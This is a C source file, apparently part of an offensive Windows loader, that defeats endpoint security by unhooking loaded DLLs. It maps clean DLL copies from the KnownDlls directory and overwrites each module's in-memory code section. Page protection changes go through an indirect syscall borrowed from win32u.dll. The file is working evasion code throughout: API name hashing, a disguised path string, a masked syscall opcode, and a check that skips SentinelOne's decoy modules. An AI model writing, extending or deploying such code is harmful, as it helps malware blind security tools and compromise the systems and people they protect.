#include <Windows.h>

#include "Structures.h"
#include "Utilities.h"
#include "DebugMacros.h"
#include "TrapSyscallsTampering.h"
#include "Configuration.h"


#ifdef UNHOOK_LOADED_DLLS



// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Global Variables

NT_SYSCALL      g_NtProtectVirtualMemory    = { 0 };

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL InitializeWin32uDllNtCall()
{
    HMODULE                 hWin32u                     = NULL;
    PIMAGE_NT_HEADERS       pNtHdrs                     = NULL;
    PIMAGE_SECTION_HEADER   pSecHdr                     = NULL;
	ULONG_PTR               uTextSectionBaseAddr        = 0x00,
                            uWin32uSyscallInstAddr      = 0x00;

    if (!(hWin32u = GetModuleHandleH(FNV1A_WIN32U)))
    {
		DBG_PRINT_A("[!] GetModuleHandleH Failed To Get The Base Address Of Win32u.dll");
        return FALSE;
	}

    if (!FetchNtSyscall(FNV1A_NtProtectVirtualMemory, &g_NtProtectVirtualMemory))
        return FALSE;

	pNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)hWin32u + ((PIMAGE_DOS_HEADER)hWin32u)->e_lfanew);
	if (pNtHdrs->Signature != IMAGE_NT_SIGNATURE) return FALSE;

	pSecHdr = IMAGE_FIRST_SECTION(pNtHdrs);
    
    for (WORD i = 0; i < pNtHdrs->FileHeader.NumberOfSections; i++)
    {
        if ((*(ULONG*)pSecHdr[i].Name | 0x20202020) == 'xet.')
        {
            uTextSectionBaseAddr = (ULONG_PTR)((PBYTE)hWin32u + pSecHdr[i].VirtualAddress);

            for (SIZE_T cbI = 0; cbI < pSecHdr[i].Misc.VirtualSize; cbI++)
            {
                if (*(USHORT*)(uTextSectionBaseAddr + cbI) == (g_wSyscallOpcode ^ 0x1234))
                {
					uWin32uSyscallInstAddr = uTextSectionBaseAddr + cbI;
					break;
                }
            }

            break;
        }
    }

    if (!uWin32uSyscallInstAddr) return FALSE;

	g_NtProtectVirtualMemory.pSyscallInstAddress = (PVOID)uWin32uSyscallInstAddr;

	return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static VOID BuildKnownDllsPath(OUT WCHAR* szKnownDllsDir)
{
    szKnownDllsDir[0] = L'^' - 2;     // '\'
    szKnownDllsDir[1] = L'N' - 3;     // 'K'
    szKnownDllsDir[2] = L'r' - 4;     // 'n'
    szKnownDllsDir[3] = L's' - 4;     // 'o'
    szKnownDllsDir[4] = L'y' - 2;     // 'w'
    szKnownDllsDir[5] = L'r' - 4;     // 'n'
    szKnownDllsDir[6] = L'H' - 4;     // 'D'
    szKnownDllsDir[7] = L'p' - 4;     // 'l'
    szKnownDllsDir[8] = L'p' - 4;     // 'l'
    szKnownDllsDir[9] = L'u' - 2;     // 's'
    szKnownDllsDir[10] = L'^' - 2;     // '\'
    szKnownDllsDir[11] = L'\0';
}

static ULONG_PTR GetDllFromKnownDllsDir(IN LPWSTR szDllName)
{
    HANDLE              hSection                = NULL;
    PVOID               pBaseAddress            = NULL;
    UNICODE_STRING      usDllName               = { 0 };
    OBJECT_ATTRIBUTES   ObjectAttributes        = { 0 };
	volatile WCHAR      szKnownDllsDir[32]      = { 0 };
    WCHAR               szFullDllName[MAX_PATH] = { 0 };
    SIZE_T              cbViewSize              = 0x00;
    NTSTATUS			STATUS                  = STATUS_SUCCESS;

	BuildKnownDllsPath(szKnownDllsDir);

	wsprintfW(szFullDllName, L"%s%s", szKnownDllsDir, szDllName);
	RtlInitUnicodeString(&usDllName, szFullDllName);
	InitializeObjectAttributes(&ObjectAttributes, &usDllName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    INVOKE_SYSCALL(FNV1A_NtOpenSection, STATUS, &hSection, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &ObjectAttributes);
    if (!NT_SUCCESS(STATUS) || !hSection) return 00UL;


	INVOKE_SYSCALL(FNV1A_NtMapViewOfSection, STATUS, hSection, NtGetCurrentProcess(), &pBaseAddress, 0x00, 0x00, NULL, &cbViewSize, ViewShare, 0x00, PAGE_READONLY);
    if (!NT_SUCCESS(STATUS) || !pBaseAddress)
    {
		DBG_PRINT_A("[!] NtMapViewOfSection Failed With Status: 0x%08X", STATUS);
    }

    CloseHandle(hSection);

	return NT_SUCCESS(STATUS) ? (ULONG_PTR)pBaseAddress : 00UL;
}


static BOOL FetchTextSectionInfo(IN HMODULE hModule, OUT PULONG_PTR puTextBase, OUT PSIZE_T pcbTextSize)
{
    PIMAGE_DOS_HEADER       pDosHdr     = NULL;
    PIMAGE_NT_HEADERS       pNtHdrs     = NULL;
    PIMAGE_SECTION_HEADER   pSecHdr     = NULL;
    
    *puTextBase     = 0x00;
    *pcbTextSize    = 0x00;
    
    pDosHdr = (PIMAGE_DOS_HEADER)hModule;
    if (pDosHdr->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    
    pNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pDosHdr + pDosHdr->e_lfanew);
    if (pNtHdrs->Signature != IMAGE_NT_SIGNATURE) return FALSE;
    
    pSecHdr = IMAGE_FIRST_SECTION(pNtHdrs);
    
    for (WORD i = 0; i < pNtHdrs->FileHeader.NumberOfSections; i++)
    {
        if ((*(ULONG*)pSecHdr[i].Name | 0x20202020) == 'xet.') 
        {
            *puTextBase     = (ULONG_PTR)((PBYTE)hModule + pSecHdr[i].VirtualAddress);
            *pcbTextSize    = pSecHdr[i].Misc.VirtualSize;
            return TRUE;
        }
    }
    
    return FALSE;
}

// There is no other way to implement it!
__forceinline static VOID _RtlCopyMemory(IN PVOID Destination, IN CONST PVOID Source, IN SIZE_T Length)
{
    volatile unsigned char* pDst = (volatile unsigned char*)Destination;
    volatile unsigned char* pSrc = (volatile unsigned char*)Source;

#ifdef _WIN64
    // Copy 8 bytes at a time 
    while (Length >= sizeof(ULONGLONG))
    {
        *(volatile ULONGLONG*)pDst = *(volatile ULONGLONG*)pSrc;
        pDst += sizeof(ULONGLONG);
        pSrc += sizeof(ULONGLONG);
        Length -= sizeof(ULONGLONG);
    }
#endif

    // Copy 4 bytes at a time
    while (Length >= sizeof(ULONG))
    {
        *(volatile ULONG*)pDst = *(volatile ULONG*)pSrc;
        pDst += sizeof(ULONG);
        pSrc += sizeof(ULONG);
        Length -= sizeof(ULONG);
    }

    // Copy 2 bytes at a time
    while (Length >= sizeof(USHORT))
    {
        *(volatile USHORT*)pDst = *(volatile USHORT*)pSrc;
        pDst += sizeof(USHORT);
        pSrc += sizeof(USHORT);
        Length -= sizeof(USHORT);
    }

    // Copy remaining bytes
    while (Length)
    {
        *pDst++ = *pSrc++;
        Length--;
    }
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==


BOOL UnhookLoadedDlls()
{
    PPEB                    pPeb                        = NULL;
    PPEB_LDR_DATA           pLdr                        = NULL;
    PLDR_DATA_TABLE_ENTRY   pEntry                      = NULL;
    PLIST_ENTRY             pListHead                   = NULL, 
                            pListEntry                  = NULL;
	HMODULE					hCleanModule                = NULL;
    ULONG_PTR               uCleanTextSectionBase       = 0x00,
                            uCurrentTextSectionBase     = 0x00;
	SIZE_T 				    cbCleanTextSectionSize      = 0x00,
                            cbCurrentTextSectionSize    = 0x00,
                            cbRegionSize                = 0x00;
    DWORD                   dwOldProtection             = 0x00,
                            dwUnhookedCount             = 0x00;
    NTSTATUS			    STATUS                      = STATUS_SUCCESS;

    if (!InitializeWin32uDllNtCall()) 
        return FALSE;

#ifdef _WIN64
    pPeb = (PPEB)__readgsqword(0x60);
#endif

    if (!pPeb || !pPeb->Ldr) return NULL;

    pLdr        = (PPEB_LDR_DATA)pPeb->Ldr;
    pListHead   = &pLdr->InLoadOrderModuleList;
    pListEntry  = pListHead->Flink;


    while (pListEntry != pListHead)
    {
        pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

        if (pEntry->BaseDllName.Buffer && pEntry->DllBase)
        {
            if (pListEntry == pListHead->Flink)
                goto _NEXT_MODULE;

			// Skip Win32u.dll Because We Are Using It To Perform NtProtectVirtualMemory Syscalls (We Cant Make It RW)
            if (HASH_STRING_W_CI(pEntry->BaseDllName.Buffer) == FNV1A_WIN32U)
                goto _NEXT_MODULE;

            // S1 is goofy
            if (HASH_STRING_W_CI(pEntry->BaseDllName.Buffer) == FNV1A_S1_FAKE_NTD1L || HASH_STRING_W_CI(pEntry->BaseDllName.Buffer) == FNV1A_S1_FAKE_KERN3l32)
				goto _NEXT_MODULE;

            if (!(hCleanModule = GetDllFromKnownDllsDir(pEntry->BaseDllName.Buffer))) 
                goto _NEXT_MODULE;

            if (!FetchTextSectionInfo(hCleanModule, &uCleanTextSectionBase, &cbCleanTextSectionSize))
            {
                DBG_PRINT_W(L"[-] Failed to Fetch The Clean .text Section For: %ls", pEntry->BaseDllName.Buffer);
                goto _NEXT_MODULE;
            }

            if (!FetchTextSectionInfo((HMODULE)pEntry->DllBase, &uCurrentTextSectionBase, &cbCurrentTextSectionSize))
            {
                DBG_PRINT_W(L"[-] Failed to Fetch The Current .text Section For: %ls", pEntry->BaseDllName.Buffer);
                goto _NEXT_MODULE;
            }

			cbRegionSize = min(cbCleanTextSectionSize, cbCurrentTextSectionSize);

            /*
            INVOKE_SYSCALL(FNV1A_NtProtectVirtualMemory, STATUS, NtGetCurrentProcess(), &uCurrentTextSectionBase, &cbRegionSize, PAGE_READWRITE, &dwOldProtection);
            if (!NT_SUCCESS(STATUS))
            {
                DBG_PRINT_A("[!] NtProtectVirtualMemory Failed With Status: 0x%08X", STATUS);
                goto _NEXT_MODULE;
            }
            */
            
            SET_SYSCALL(g_NtProtectVirtualMemory);
            STATUS = RunSyscall(NtGetCurrentProcess(), &uCurrentTextSectionBase, &cbRegionSize, PAGE_READWRITE, &dwOldProtection);
            if (!NT_SUCCESS(STATUS))
            {
                DBG_PRINT_A("[!] NtProtectVirtualMemory Failed With Status: 0x%08X", STATUS);
                goto _NEXT_MODULE;
            }

			_RtlCopyMemory((PVOID)uCurrentTextSectionBase, (PVOID)uCleanTextSectionBase, (min(cbCleanTextSectionSize, cbCurrentTextSectionSize)));

            SET_SYSCALL(g_NtProtectVirtualMemory);
            STATUS = RunSyscall(NtGetCurrentProcess(), &uCurrentTextSectionBase, &cbRegionSize, dwOldProtection, &dwOldProtection);
            if (!NT_SUCCESS(STATUS))
            {
                DBG_PRINT_A("[!] NtProtectVirtualMemory Failed With Status: 0x%08X", STATUS);
                goto _NEXT_MODULE;
            }

            /*
            INVOKE_SYSCALL(FNV1A_NtProtectVirtualMemory, STATUS, NtGetCurrentProcess(), &uCurrentTextSectionBase, &cbRegionSize, dwOldProtection, &dwOldProtection);
            if (!NT_SUCCESS(STATUS))
            {
                DBG_PRINT_A("[!] NtProtectVirtualMemory Failed With Status: 0x%08X", STATUS);
                goto _NEXT_MODULE;
            }
            */


            INVOKE_SYSCALL(FNV1A_NtUnmapViewOfSection, STATUS, NtGetCurrentProcess(), hCleanModule);

            dwUnhookedCount++;

_NEXT_MODULE:
            pListEntry = pListEntry->Flink;
            continue;
        }
    }

	DBG_PRINT_A("[+] Unhooked %d Modules", dwUnhookedCount);

    return (dwUnhookedCount > 0x00);
}


#endif // UNHOOK_LOADED_DLLS
